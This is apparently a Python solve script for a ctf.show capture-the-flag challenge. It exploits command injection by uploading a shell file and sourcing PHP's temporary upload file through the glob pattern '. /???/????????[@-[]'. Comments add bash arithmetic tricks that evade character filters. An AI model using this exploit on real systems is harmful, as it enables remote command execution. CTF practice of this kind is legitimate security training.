import requests

while True:
    #   八个问号+一个大写字母 , 比如/tmp/phpabcdeZ , 其中Z这个位置一定是大写
    #   "@-["   代表ASCII码中 的大写字母
    url = "http://78f91adc-cf56-47b2-b619-ad4197f2e1f0.challenge.ctf.show/?c=.%20/???/????????[@-[]"
    r = requests.post(url, files={"file": ('1.php', b'cat flag.php')})
    if r.text.find("flag") > 0:
        print(r.text)
        break
#   $((${_}))=0=A
#   $((~$((${_}))))=-1
#   $((~0))
#   $((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))
